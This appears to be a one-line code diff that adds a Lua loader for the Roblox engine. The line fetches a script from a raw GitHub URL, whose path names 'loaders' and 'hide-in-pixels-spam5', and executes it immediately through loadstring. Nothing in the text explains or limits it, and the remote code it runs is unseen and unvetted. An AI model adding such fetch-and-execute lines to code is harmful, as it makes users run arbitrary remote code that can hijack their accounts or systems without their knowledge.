@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/hide-in-pixels-spam5-nkj7j4ewmdj8gm.lua"))()
